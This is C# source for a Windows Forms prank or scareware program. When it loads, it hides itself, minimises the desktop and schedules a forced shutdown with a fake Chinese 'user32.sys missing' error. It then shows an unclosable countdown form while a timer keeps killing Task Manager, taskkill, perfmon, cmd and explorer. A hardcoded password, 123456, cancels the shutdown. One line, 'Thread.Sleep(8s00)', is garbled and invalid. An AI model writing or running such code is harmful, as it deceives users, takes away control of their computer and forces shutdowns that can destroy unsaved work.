using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace wnexe
{
    public partial class Form1 : System.Windows.Forms.Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        int time = 180;

        private void Form_Load(object sender, EventArgs e)
        {
            Hide();

            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardInput = true;
            process.Start();
            process.StandardInput.AutoFlush = true;

            Type oleType = Type.GetTypeFromProgID("Shell.Application");
            object oleObject = Activator.CreateInstance(oleType);
            oleType.InvokeMember("ToggleDesktop", BindingFlags.InvokeMethod, null, oleObject, null);

            process.StandardInput.WriteLine("shutdown /s /t 200 /f /c \"系统错误： “user32.sys” 丢失。\r\n系统应立即重启\" /d u:5:15");

            timer.Enabled = true;
            label_time.Text = string.Format("{0:D2}:{1:D2}", (time - time % 60) / 60, time % 60);

            Thread.Sleep(8s00);

            Show();

            process.StandardInput.WriteLine("start exit");
            process.StandardInput.WriteLine("exit");
            process.WaitForExit(1000);
            timer_kill.Enabled = true;
        }

        bool closed = false;

        private void Form_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = !closed;
        }

        private void timer_Tick(object sender, EventArgs e)
        {
            time--;
            if (time == 0)
            {
                label_time.Text = "00:00";
                timer.Enabled = false;
                label_error.Text = "时间到";
                textBox.Enabled = false;
                return;
            }
            label_time.Text = string.Format("{0:D2}:{1:D2}", (time - time % 60) / 60, time % 60);
        }

        private void textBox_TextChanged(object sender, EventArgs e)
        {
            if (textBox.Text == "123456")
            {
                timer.Enabled = timer_kill.Enabled = false;
                label_error.Text = "密码正确";
                textBox.Enabled = false;
                closed = true;
                Process process = new Process();
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.RedirectStandardInput = true;
                process.Start();
                process.StandardInput.AutoFlush = true;

                process.StandardInput.WriteLine("shutdown /a");
                process.StandardInput.WriteLine("explorer");
                process.StandardInput.WriteLine("exit");
                process.WaitForExit(1000);
                ControlBox = true;
            }
        }

        private void timer_kill_Tick(object sender, EventArgs e)
        {
            Process[] taskkill = Process.GetProcessesByName("taskkill");
            foreach (var p in taskkill)
            {
                try
                {
                    p.Kill();
                }
                catch (Win32Exception)
                { }
            }
            Process[] taskmgr = Process.GetProcessesByName("taskmgr");
            foreach (var p in taskmgr)
            {
                try
                {
                    p.Kill();
                }
                catch (Win32Exception)
                { }
            }
            Process[] perfmon = Process.GetProcessesByName("perfmon");
            foreach (var p in perfmon)
            {
                try
                {
                    p.Kill();
                }
                catch (Win32Exception)
                { }
            }
            Process[]cmd = Process.GetProcessesByName("cmd");
            foreach (var p in cmd)
            {
                try
                {
                    p.Kill();
                }
                catch (Win32Exception)
                { }
            }
            Process[] explorer = Process.GetProcessesByName("explorer");
            foreach (var p in explorer)
            {
                try
                {
                    p.Kill();
                }
                catch (Win32Exception)
                { }
            }
        }
    }
}
